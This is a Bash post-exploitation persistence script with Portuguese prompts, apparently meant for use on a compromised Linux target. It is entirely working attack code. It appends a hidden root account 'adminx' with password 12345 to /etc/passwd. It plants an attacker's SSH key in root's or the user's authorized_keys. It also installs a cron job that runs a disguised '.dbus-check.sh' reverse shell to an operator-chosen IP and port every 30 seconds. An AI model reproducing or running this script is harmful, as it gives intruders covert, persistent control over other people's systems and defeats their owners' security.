#!/bin/bash

read -p "Você tem acesso root no alvo? (y/n): " HAS_ROOT

# === Seleção de persistências ===
echo "[1] Criar usuário root adminx"
echo "[2] Adicionar chave SSH"
echo "[3] Agendar shell reverso"
echo "[4] Todas as opções"
read -p "Escolha a persistência (1/2/3/4): " PERSIST_OPTION

if [[ "$PERSIST_OPTION" == "3" || "$PERSIST_OPTION" == "4" ]]; then
    read -p "IP para reverse shell: " REV_IP
    read -p "Porta para reverse shell: " REV_PORT
fi

# === Configurações ===
KEY='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCTOTrMaVGdi64llcLVFl90qOX9+0ABkyhDOXlsDOA7497MOdfe5YGxLx59af3iIf66A9KK97swswXZJvBAnTz1D3ile9jDMFdrNC9ArdYVT8zognYEA4J2a5aJtwiP1DLUie4akqnrYfSj/ecAemDncokCOzGPc6G8Ud98quTB7w82Owyrax2gNnyHMEahiap9xE/GbCbS4ElzyPlqdyVMH2HI9NTVPZmxtieXRqxlr6P9mHS57bpY8XhHxLtKGNniLIdvlHfXfqp/f2u7snHaN3v4ic36sprl98xQd8VW3fPd3vzTuK2mckMThEmpvXd2mkNgNTbQSYvloD2Ch1EL kali@kali'
SHELL_SCRIPT_ROOT="/usr/local/bin/.dbus-check.sh"
SHELL_SCRIPT_USER="/tmp/.dbus-check.sh"

# Detectar algoritmo de hash
if openssl passwd -6 test >/dev/null 2>&1; then
    HASH=$(openssl passwd -6 12345)
elif openssl passwd -5 test >/dev/null 2>&1; then
    HASH=$(openssl passwd -5 12345)
else
    HASH=$(openssl passwd -1 12345)
fi

# === Funções ===
create_user() {
    if ! id adminx &>/dev/null; then
        echo "adminx:${HASH}:0:0:AdminX Root:/root:/bin/bash" >> /etc/passwd
        echo "[+] Usuário root adminx criado com senha 12345"
    else
        echo "[*] Usuário adminx já existe"
    fi
}

add_ssh_key_root() {
    mkdir -p /root/.ssh
    chmod 700 /root/.ssh
    grep -qF "$KEY" /root/.ssh/authorized_keys 2>/dev/null || echo "$KEY" >> /root/.ssh/authorized_keys
    chmod 600 /root/.ssh/authorized_keys
    echo "[+] Chave SSH adicionada ao root"
}

add_ssh_key_user() {
    USER_SSH="$HOME/.ssh"
    if mkdir -p "$USER_SSH" && touch "$USER_SSH/authorized_keys"; then
        chmod 700 "$USER_SSH"
        grep -qF "$KEY" "$USER_SSH/authorized_keys" 2>/dev/null || echo "$KEY" >> "$USER_SSH/authorized_keys"
        chmod 600 "$USER_SSH/authorized_keys"
        echo "[+] Chave SSH adicionada ao usuário comum"
    else
        echo "[!] Barro! Sem permissão para gravar em $USER_SSH"
    fi
}

setup_reverseshell_cron() {
    local script_path="$1"
    echo -e "#!/bin/bash\nbash -i >& /dev/tcp/$REV_IP/$REV_PORT 0>&1" > "$script_path"
    chmod +x "$script_path"

    crontab -l 2>/dev/null | grep -v "$script_path" > /tmp/.c2 2>/dev/null
    echo "* * * * * $script_path" >> /tmp/.c2
    echo "* * * * * sleep 30; $script_path" >> /tmp/.c2
    crontab /tmp/.c2 && rm /tmp/.c2
    echo "[+] Reverse shell configurado via cron para cada 30 segundos"
}

# === Execução ===
if [[ "$HAS_ROOT" =~ ^[Yy]$ ]]; then
    echo "[+] Executando como root"

    [[ "$PERSIST_OPTION" == "1" || "$PERSIST_OPTION" == "4" ]] && create_user
    [[ "$PERSIST_OPTION" == "2" || "$PERSIST_OPTION" == "4" ]] && add_ssh_key_root
    [[ "$PERSIST_OPTION" == "3" || "$PERSIST_OPTION" == "4" ]] && setup_reverseshell_cron "$SHELL_SCRIPT_ROOT"

else
    echo "[*] Sem acesso root — Aplicando como usuário comum"

    [[ "$PERSIST_OPTION" == "2" || "$PERSIST_OPTION" == "4" ]] && add_ssh_key_user
    [[ "$PERSIST_OPTION" == "3" || "$PERSIST_OPTION" == "4" ]] && setup_reverseshell_cron "$SHELL_SCRIPT_USER"
fi
